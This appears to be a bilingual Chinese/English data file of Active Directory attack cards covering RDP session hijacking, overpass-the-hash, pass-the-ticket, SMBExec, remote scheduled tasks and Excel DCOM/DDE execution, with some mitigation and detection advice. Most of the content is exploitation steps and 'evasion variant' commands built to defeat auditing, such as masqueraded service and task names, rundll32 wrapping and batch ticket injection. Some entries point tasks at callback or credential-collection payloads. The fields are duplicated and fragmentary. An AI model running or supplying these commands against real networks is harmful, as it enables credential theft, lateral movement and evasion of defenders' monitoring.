description.en: Run tscon SESSION_ID /dest:console to switch someone's session to the local console; entering their desktop without the password exposes logged-in apps and documents.

title.en: Mine the hijacked session for secrets

description.zh: 用 mimikatz ts::sessions 列出会话并以 ts::remote /id 切入；在会话内执行命令或导出内存凭据即完成对高权限账号的控制。
description.en: List sessions with ts::sessions and enter via ts::remote /id; running commands or dumping in-memory credentials from the session completes control of the privileged account.

analysis.zh: RDP 会话隔离与接管防护审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: RDP Session Isolation and Takeover Protection Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只列出实验会话元数据和授权策略，不运行 tscon 或接管其他会话。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: SYSTEM 上下文接管规避变体

description.zh: 绕过普通用户无法 tscon 其他会话的限制与失败审计：以 SYSTEM 上下文执行接管。成功判据：物理控制台切换到目标会话。
description.en: Evades the privilege failure audit when a normal user runs tscon against another session by taking over in the SYSTEM context. Success: the physical console switches to the target session.

title.zh: mimikatz ts 远程规避变体

description.zh: 绕过 tscon 的独立命令审计：经 mimikatz 的 ts 模块走同一路径但进程特征不同。成功判据：会话进入远程查看状态。
description.en: Evades standalone tscon auditing by driving the same path through mimikatz's ts module with a different process signature. Success: the session enters remote-view state.

title.zh: 一行管道自动定位规避变体

description.zh: 绕过手动 query+tscon 两步操作的审计关联：单进程内定位并接管。成功判据：目标用户会话被切到 console。
description.en: Evades the audit correlation between a manual query and tscon by locating and taking over inside a single process. Success: the target user's session switches to console.

name.zh: NTLM 到 Kerberos 票据边界审计

description.zh: NTLM 到 Kerberos 票据边界审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: NTLM-to-Kerberos Ticket-Boundary Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 NTLM 到 Kerberos 票据边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTLM-to-Kerberos Ticket-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: NTLM 到 Kerberos 票据边界审计覆盖 Overpass-the-Hash 场景：针对已获取 NTLM 哈希的测试主体，验证能否把哈希转换为完整 Kerberos 票据并以域身份访问资源。验证维度涵盖 mimikatz /ptt 注入、Rubeus RC4 申请 TGT 与 Impacket getTGT 三条路径。
overview.en: NTLM-to-Kerberos Ticket-Boundary Audit covers Overpass-the-Hash: for a test principal holding an NTLM hash, verify whether the hash converts into full Kerberos tickets granting domain identity access. Verification dimensions cover mimikatz /ptt injection, Rubeus RC4 TGT requests, and Impacket getTGT.

vulnerability.zh: 根因是域允许 RC4 加密类型时，NTLM 哈希可直接参与 Kerberos 预认证计算向 KDC 申请合法 TGT；攻击者无需明文口令即获得完整域身份，哈希泄露因此在 Kerberos 环境下等价于口令泄露。
vulnerability.en: The root cause is that when the domain permits RC4 encryption types, the NTLM hash feeds directly into Kerberos pre-authentication to request a legitimate TGT from the KDC; the attacker gains a full domain identity without the plaintext, so hash leakage equals password leakage in Kerberos environments.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 sekurlsa::pth /ptt 注入票据并启动新进程，klist 显示目标用户 TGT 即确认成功；第 2 步用 Rubeus asktgt /rc4 申请 TGT 并注入当前会话，可访问域资源即确认转换可用；第 3 步用 getTGT.py 写出 ccache 票据文件，配合 KRB5CCNAME 在跨平台环境验证。三条路径成功判据一致：以目标身份取得可用域票据。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 injects a ticket with sekurlsa::pth /ptt and spawns a new process — the target user's TGT in klist confirms success; step 2 requests a TGT with Rubeus asktgt /rc4 and injects it into the current session — domain resource access confirms the conversion works; step 3 writes a ccache ticket file with getTGT.py and validates cross-platform via KRB5CCNAME. All three share one success criterion: a usable domain ticket as the target identity. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 将域功能级别提升至强制 AES Kerberos，禁用 RC4/DES 加密类型，为敏感账号启用保护组与账号隔离；监控 4768 中 RC4 加密类型的 TGT 请求并告警。修复后用第 2 步样例回归，RC4 预认证应被 KDC 直接拒绝。
mitigation.en: Raise the domain functional level to enforce AES Kerberos, disable RC4/DES encryption types, and enable protected groups and account isolation for sensitive accounts; alert on RC4-encrypted TGT requests in 4768. After the fix, regress with the step 2 sample: RC4 pre-authentication must be rejected by the KDC.

title.zh: 哈希换取 Kerberos 票据
title.en: Convert a hash into Kerberos tickets

description.zh: 用 sekurlsa::pth /ptt 将 NTLM 哈希转为票据注入内存；新会话 klist 可见 TGT 即以 Kerberos 身份活动、绕开 NTLM 限制。
description.en: Use sekurlsa::pth /ptt to turn the NTLM hash into an injected ticket; a TGT visible via klist means you now act over Kerberos, bypassing NTLM restrictions.

title.zh: Rubeus 请求 TGT 注入
title.en: Request and inject a TGT with Rubeus

description.zh: 用 Rubeus asktgt /rc4:哈希 请求 TGT 并以 /ptt 注入；票据列表刷新即完成身份转换，适用禁用 NTLM 的环境。
description.en: Request a TGT with Rubeus asktgt /rc4:<hash> and inject with /ptt; the refreshed ticket list completes the identity shift for NTLM-disabled environments.

description.zh: Linux 侧用 getTGT.py 以哈希获取 TGT；导出 ccache 并设置 KRB5CCNAME 后即可用 -k 参数横向到其他域内主机。
description.en: On Linux use getTGT.py with the hash; exporting the ccache and setting KRB5CCNAME enables -k tooling to move laterally to other domain hosts.

analysis.zh: NTLM 到 Kerberos 票据边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTLM-to-Kerberos Ticket-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 使用合成票据元数据核对加密类型、日志与身份绑定，不注入哈希或请求真实 TGT。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过 RC4(etype23) 票据请求的弱加密告警：改用 AES256 密钥请求，票据类型为强加密。成功判据：TGT 注入且事件中 etype 为 0x12。
description.en: Evades weak-encryption alerts on RC4 (etype23) ticket requests by requesting with an AES256 key so the ticket uses strong crypto. Success: TGT injected and events show etype 0x12.

title.zh: getTGT 密钥变形规避变体

description.zh: 绕过哈希请求特征：以 AES 密钥形态离线取票，流量仅为标准 AS-REQ。成功判据：生成 ccache 且无 etype23 出现。
description.en: Evades hash-request signatures by fetching the ticket offline with the AES key, leaving only standard AS-REQ traffic. Success: ccache generated with no etype23 present.

title.zh: ccache 环境注入规避变体

description.zh: 绕过票据导入的工具特征（ptt/文件操作）：以 ccache 环境变量方式让标准工具自动取票。成功判据：klist 显示票据且 smbclient 访问成功。
description.en: Evades ticket-import tooling signatures (ptt/file operations) by pointing KRB5CCNAME at the ccache so standard tools pick it up automatically. Success: klist shows the ticket and smbclient access works.

name.zh: Kerberos 票据导入防护审计

description.zh: Kerberos 票据导入防护审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Kerberos Ticket-Import Protection Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Kerberos 票据导入防护审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Kerberos Ticket-Import Protection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: Kerberos 票据导入防护审计覆盖票据传递场景：针对已从内存导出 .kirbi 票据的测试主体，验证票据能否导入其他会话或主机并直接以原身份访问服务。验证维度涵盖内存票据导出、mimikatz ptt 注入与 Rubeus base64 注入三条路径。
overview.en: Kerberos Ticket-Import Protection Audit covers pass-the-ticket: for a test principal holding .kirbi tickets exported from memory, verify whether the tickets import into other sessions or hosts and access services as the original identity. Verification dimensions cover in-memory ticket export, mimikatz ptt injection, and Rubeus base64 injection.

vulnerability.zh: 根因是 Kerberos 票据在有效期内与来源主体、来源主机解耦，.kirbi 文件可在任意机器导入使用；服务端不做 PAC 来源校验、终端未启用凭据守护时，被导出的票据等同于身份本身，可在票据剩余寿命内自由复用。
vulnerability.en: The root cause is that Kerberos tickets are decoupled from the originating principal and host for their validity period, and .kirbi files import on any machine; without server-side PAC origin validation or endpoint credential guard, an exported ticket equals the identity itself and is freely reusable for its remaining lifetime.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 sekurlsa::tickets /export 从目标内存导出票据，当前目录生成多个 .kirbi 文件即确认成功；第 2 步用 kerberos::ptt 把目标服务票据导入当前会话，klist 显示该票据且可访问对应资源即确认接管；第 3 步用 Rubeus ptt /ticket:<base64> 在另一台主机复现跨机导入。票据在过期前均可重复利用；LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 exports tickets from target memory with sekurlsa::tickets /export — multiple .kirbi files appearing locally confirm success; step 2 imports the target service ticket with kerberos::ptt — klist showing the ticket plus access to the corresponding resource confirms takeover; step 3 replays cross-machine import on another host with Rubeus ptt /ticket:<base64>. Tickets remain reusable until expiry; replace LAB_* placeholders via the global variables menu.

mitigation.zh: 对敏感服务账号启用 Kerberos 凭据守护与 PAC 签名校验，缩短服务票据生命周期，限制调试权限阻断内存导出；监控同一票据在多主机的异常使用。修复后用第 2 步样例回归，导入的票据应被服务以 PAC 校验失败拒绝。
mitigation.en: Enable Kerberos credential guard and PAC signature validation for sensitive service accounts, shorten service-ticket lifetimes, and restrict debug privileges to block memory export; monitor the same ticket used across multiple hosts. After the fix, regress with the step 2 sample: imported tickets must fail PAC validation at the service.

description.zh: 在已控主机运行 sekurlsa::tickets /export；生成一批 .kirbi 文件即可跨机复用，优先挑高权限账号的票据。
description.en: Run sekurlsa::tickets /export on the controlled host; the exported .kirbi files are reusable across machines, privileged accounts first.

title.zh: 注入票据冒充他人身份

description.zh: 将选中的 ticket.kirbi 用 kerberos::ptt 注入当前会话；klist 显示他人票据即身份冒充完成，可直接访问其授权资源。
description.en: Inject the chosen ticket.kirbi with kerberos::ptt; the foreign ticket shown by klist completes impersonation and opens its authorized resources.

title.zh: 跨机复用票据收割资源

description.zh: 把票据 Base64 后用 Rubeus ptt 注入跳板机；无需口令即访问该账号可用的 SMB、数据库等资源，完成票据横向。
description.en: Base64 the ticket and inject on the pivot with Rubeus ptt; the account's SMB and database resources open without its password, completing ticket-based lateral movement.

analysis.zh: Kerberos 票据导入防护审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 使用离线合成 kirbi 元数据核对票据主体、服务与时效，不把票据导入登录会话。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: base64 无文件注入规避变体

description.zh: 绕过票据落盘检测（.kirbi 文件扫描）：base64 直传内存注入。成功判据：klist 出现票据且磁盘无 .kirbi 文件。
description.en: Evades on-disk ticket detection (.kirbi scanning) by injecting base64 directly into memory. Success: klist shows the ticket with no .kirbi file on disk.

title.zh: Unix ccache 注入规避变体

description.zh: 绕过 Windows 侧 ptt 工具特征：在 Unix 侧以 ccache 完成同等票据注入使用。成功判据：kvno 返回服务票据。
description.en: Evades Windows-side ptt tooling signatures by achieving the same ticket usage via ccache on the Unix side. Success: kvno returns a service ticket.

title.zh: 多票据循环注入规避变体

wafBypass.command: for t in {LAB_TGT_KIRBI} {LAB_SVC_KIRBI}; do Rubeus.exe ptt /ticket:$t; done; klist

description.zh: 绕过单票据注入的时间窗检测：批量循环导入降低单位时间事件密度关联。成功判据：klist 列出全部注入票据。
description.en: Evades time-window detection on single-ticket injection by importing in a batch loop to dilute per-time event correlation. Success: klist lists all injected tickets.

name.zh: SMBExec 远程服务写入防护

description.zh: SMBExec 远程服务写入防护保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: SMBExec Remote-Service Write Protection preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 SMBExec 远程服务写入防护 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for SMBExec Remote-Service Write Protection are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: SMBExec 远程服务写入防护覆盖 SMB 服务控制场景：针对持有目标管理员凭据的测试主体，验证能否经 SMB 写入并启动远程服务获得命令执行。验证维度涵盖 smbexec.py 自动化半交互 shell 与 sc 原生命令手动创建、启动、删除的完整流程。
overview.en: SMBExec Remote-Service Write Protection covers SMB service control: for a test principal holding target administrator credentials, verify whether a remote service can be written and started over SMB for command execution. Verification dimensions cover the automated semi-interactive smbexec.py shell and the manual sc create/start/delete workflow.

vulnerability.zh: 根因是 ADMIN$ 共享与服务控制管理器允许管理员主体远程创建服务，服务 binPath 可指向任意命令行；smbexec 借此把命令输出经 SMB 管道回传，形成不留盘上文件的执行通道，7045 服务创建事件是主要审计痕迹。
vulnerability.en: The root cause is that the ADMIN$ share and the Service Control Manager let administrators create services remotely with binPath pointing at arbitrary command lines; smbexec pipes command output back over SMB, yielding a fileless execution channel whose primary audit trace is the 7045 service-creation event.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 smbexec.py 建立半交互 shell，命令输出经 SMB 返回即确认成功；第 2 步用 sc \HOST create/start/delete 手动复现：创建 evilsvc 指向 cmd /c whoami，启动后回收输出，再删除服务清理痕迹，目标侧对应 7045 创建与删除事件。该路径无需落盘，适合批量横向前验证凭据有效性。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 runs smbexec.py for a semi-interactive shell — command output returning over SMB confirms success; step 2 replays manually with sc \HOST create/start/delete: create evilsvc pointing at cmd /c whoami, start it to capture output, then delete the service, matching 7045 create/delete events on the target. The path is fileless and suits credential validation before batch lateral movement. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 限制 ADMIN$ 与服务控制远程访问到管理网段专用账号，启用 SMB 签名，实施本地管理员隔离与 LAPS 轮换；对 7045 服务创建事件建立实时告警并审计 binPath 内容。修复后用第 1、2 步样例回归，远程服务创建应被拒绝并触发告警。
mitigation.en: Restrict ADMIN$ and service-control remote access to dedicated management-segment accounts, enable SMB signing, and enforce local-admin isolation with LAPS rotation; build real-time alerts on 7045 service-creation events and audit binPath contents. After the fix, regress with the step 1 and step 2 samples: remote service creation must be denied and raise an alert.

description.zh: 确认手握目标管理员口令或 NTLM 哈希，且 445 端口可达、ADMIN$ 可写；条件齐备即可走服务创建方式横向。
description.en: Hold an admin password or NTLM hash for the target, with port 445 reachable and ADMIN$ writable; with these met, service-creation lateral movement is viable.

description.zh: 用 smbexec.py 以口令或哈希登录目标；返回管理员级半交互 shell、命令经共享目录中转即服务化横向通道建立。
description.en: Log in with smbexec.py using password or hash; an admin-level shell with commands relayed through a share establishes the service-based lateral channel.

title.zh: 原生服务落地持久执行

description.zh: 用 sc \目标 create evilsvc binPath= "cmd /c whoami"；服务查询显示创建成功且可执行即改 binPath 即可运行任意载荷。
description.en: Create evilsvc via sc \\target create ... binPath= "cmd /c whoami"; a created, runnable service only needs a new binPath to carry any payload.

description.zh: 用 sc delete 移除 evilsvc 并清理 smbexec 中转残留文件；通道用后即焚，避免巡检时发现异常服务项。
description.en: Remove evilsvc with sc delete and clear smbexec relay leftovers; burning the channel after use avoids anomalous services surfacing in inspection.

opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对实验主机服务控制器与 ADMIN$ 权限及事件，不创建、启动或删除远程服务。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过对 smbexec 默认服务名的规则匹配：伪装时间同步类服务名。成功判据：shell 建立且服务名无告警。
description.en: Evades rule matching on smbexec's default service name by masquerading as a time-sync style service. Success: shell establishes with no alert on the service name.

title.zh: rundll32 包装执行规避变体

wafBypass.command: sc \\{LAB_HOST} create W32Sync binPath= "rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL cmd.dll" && sc \\{LAB_HOST} start W32Sync

description.zh: 绕过 binPath 直接 cmd.exe 的服务创建检测：以 rundll32 包装间接拉起。成功判据：服务启动且命令执行。
description.en: Evades service-creation detection on a direct cmd.exe binPath by wrapping indirect launch through rundll32. Success: service starts and the command executes.

wafBypass.command: net use \\{LAB_HOST}\IPC$ /user:{LAB_DOMAIN}\{LAB_USER} {LAB_PASSWORD} && copy output.bat \\{LAB_HOST}\IPC$\ && sc \\{LAB_HOST} create SysH binPath= "cmd /c \\{LAB_HOST}\IPC$\output.bat"

description.zh: 绕过 admin$ 共享专用的落盘监控：改走 IPC$ 命名管道共享传递脚本。成功判据：脚本经 IPC$ 执行成功。
description.en: Evades admin$-specific drop monitoring by delivering the script over the IPC$ named-pipe share instead. Success: the script executes via IPC$.

name.zh: 远程计划任务授权验证

description.zh: 远程计划任务授权验证保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Remote Scheduled-Task Authorization Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 远程计划任务授权验证覆盖计划任务远程执行场景：针对持有目标管理员凭据的测试主体，验证能否经任务计划程序管道远程注册一次性任务并回传命令输出。验证维度涵盖 atexec.py 自动化路径与 schtasks 原生命令两条入口。
overview.en: Remote Scheduled-Task Authorization Validation covers remote scheduled-task execution: for a test principal holding target administrator credentials, verify whether one-shot tasks can be registered remotely via the Task Scheduler pipe and return command output. Verification dimensions cover the automated atexec.py path and the native schtasks command.

vulnerability.zh: 根因是任务计划程序服务允许管理员主体通过 ATSVC 管道远程注册任务，任务默认以 SYSTEM 执行且一次性触发后不留常驻项；缺少 4698 任务创建监控时，该通道近乎静默，适合作为横向执行的低痕迹入口。
vulnerability.en: The root cause is that the Task Scheduler service lets administrators register tasks remotely via the ATSVC pipe; tasks run as SYSTEM and leave no resident item after a one-shot trigger. Without 4698 task-creation monitoring the channel is nearly silent, making it a low-footprint lateral-execution entry.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 atexec.py 远程执行 whoami，任务触发后回传输出且目标可见 4698 事件即确认成功；第 2 步用 schtasks /create /s 指定一次性触发时间复现，观察 4698/4699 事件对。两条路径均以 SYSTEM 执行且即时清理，适合验证凭据有效性与命令回传链路后转为其他持久化手段。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 executes whoami remotely with atexec.py — returned output after the task fires plus a 4698 event on the target confirms success; step 2 replays with schtasks /create /s using a one-shot trigger time and observes the 4698/4699 event pair. Both paths run as SYSTEM and self-clean, suiting credential validation and command-return checks before switching to other persistence. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 限制任务计划程序远程管理到管理网段专用账号，收紧远程任务注册权限，对 4698/4699 事件建立告警并审计任务 XML 中的异常命令行。修复后用第 1 步样例回归，远程任务注册应返回拒绝错误。
mitigation.en: Restrict Task Scheduler remote management to dedicated management-segment accounts, tighten remote task registration rights, alert on 4698/4699 events, and audit task XML for anomalous command lines. After the fix, regress with the step 1 sample: remote task registration must return an access-denied error.

title.zh: 计划任务远程执行命令

description.zh: 用 atexec.py 以口令或哈希登录目标执行 whoami；返回命令结果即确认任务计划服务可被远程驱动执行任意指令。
description.en: Run atexec.py with credentials and whoami; the returned output proves the task scheduler service can be driven remotely for arbitrary commands.

title.zh: 原生 schtasks 植入任务

description.zh: 用 schtasks /create /s 目标 /tn evil /tr "cmd /c whoami" /sc once 创建单次任务；任务列表出现 evil 且到点运行即载荷送达目标。
description.en: Create the once-scheduled evil task on the target with schtasks /create; the task appearing in the list and firing on schedule confirms payload delivery.

description.zh: 把 /tr 参数指向回连程序或凭据收集脚本并重新创建任务；目标主机按计划执行新载荷即获得可持续利用的命令执行通道。
description.en: Repoint /tr at a callback binary or credential collector and recreate the task; the target executing the new payload on schedule yields a persistent execution channel.

description.zh: 用 schtasks /delete /tn evil 清理已执行任务；计划任务面板与日志不再残留条目即横向动作收尾完成。
description.en: Remove the executed task with schtasks /delete /tn evil; no leftover entries in the panel or logs closes out the lateral action.

analysis.zh: 远程计划任务授权验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Remote Scheduled-Task Authorization Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只读取实验主机计划任务 ACL 与日志，不创建一次性任务或执行远程命令。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 原生 schtasks 伪装规避变体

wafBypass.command: schtasks /create /s {LAB_HOST} /u {LAB_DOMAIN}\{LAB_USER} /p {LAB_PASSWORD} /tn "\Microsoft\Windows\SysMgmt\Health" /tr "cmd /c whoami > C:\Windows\Temp\a.log" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /s {LAB_HOST} /tn "\Microsoft\Windows\SysMgmt\Health"

description.zh: 绕过 atexec.py 的 TS 文件与命名管道特征：原生 schtasks 加微软命名空间任务路径伪装。成功判据：任务执行且 a.log 生成。
description.en: Evades atexec.py TS-file and named-pipe signatures by using native schtasks with a Microsoft-namespace task path for camouflage. Success: the task runs and a.log appears.

description.zh: 绕过认证与执行同秒关联的时间线检测：任务延迟两分钟后触发，错开事件关联窗口。成功判据：延迟后 a.log 生成。
description.en: Evades timeline correlation of auth and execution in the same second by delaying the task two minutes to desynchronize the event window. Success: a.log appears after the delay.

title.zh: 输出转存共享规避变体

description.zh: 绕过 TS 文件回读特征：结果直写操作机共享，不经目标临时文件。成功判据：at.txt 含执行身份。
description.en: Evades TS-file readback signatures by writing results straight to the operator share, skipping target temp files. Success: at.txt contains the execution identity.

name.zh: Excel DCOM 激活与 DDE 防护审计
name.en: Excel DCOM Activation and DDE Protection Audit

description.zh: Excel DCOM 激活与 DDE 防护审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Excel DCOM Activation and DDE Protection Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Excel DCOM 激活与 DDE 防护审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Excel DCOM Activation and DDE Protection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: Excel DCOM 激活与 DDE 防护审计覆盖 Office COM 远程激活场景：针对持有目标管理员凭据的测试主体，验证能否远程实例化 Excel.Application 并借 DDE 单元格公式执行命令。验证维度涵盖远程 COM 实例化、DDE 公式触发执行与 dcomexec 工具化替代路径三类。
overview.en: Excel DCOM Activation and DDE Protection Audit covers Office COM remote activation: for a test principal holding the target's administrator credentials, verify whether Excel.Application can be instantiated remotely and commands executed via DDE cell formulas. Verification dimensions cover remote COM instantiation, DDE formula-triggered execution, and a dcomexec tooling alternative.

vulnerability.zh: 根因是 Excel.Application 的 DCOM 激活权限默认面向管理员组开放，远程实例化的 EXCEL.EXE 可触发 DDEInitiate 拉起子进程；Office 未通过组策略禁用 DDE 时，单元格公式即可启动 cmd，形成不创建服务的横向执行通道。
vulnerability.en: The root cause is that Excel.Application's DCOM launch permissions default to the Administrators group, and a remotely instantiated EXCEL.EXE can trigger DDEInitiate to spawn child processes; while DDE is not disabled via Group Policy, a cell formula can start cmd, yielding a lateral execution channel that creates no service.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 GetTypeFromProgID 远程创建 Excel.Application 实例，目标出现 EXCEL.EXE 进程即确认激活成功；第 2 步通过 Workbooks.Add 写入 =CMD|'/C calc'!A0 单元格公式触发 DDE，目标启动 calc 或 cmd 即确认执行链；第 3 步用 dcomexec.py -object ShellBrowserWindow 复现交互式远程执行（dcomexec 仅支持 ShellWindows/ShellBrowserWindow/MMC20 三类对象，故以 ShellBrowserWindow 作为工具化路径）。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 creates a remote Excel.Application instance via GetTypeFromProgID — EXCEL.EXE appearing on the target confirms activation; step 2 writes the =CMD|'/C calc'!A0 cell formula through Workbooks.Add to trigger DDE — calc or cmd starting on the target confirms the execution chain; step 3 replays interactive remote execution with dcomexec.py -object ShellBrowserWindow (dcomexec supports only ShellWindows/ShellBrowserWindow/MMC20, so ShellBrowserWindow serves as the tooling path). Replace LAB_* placeholders via the global variables menu.

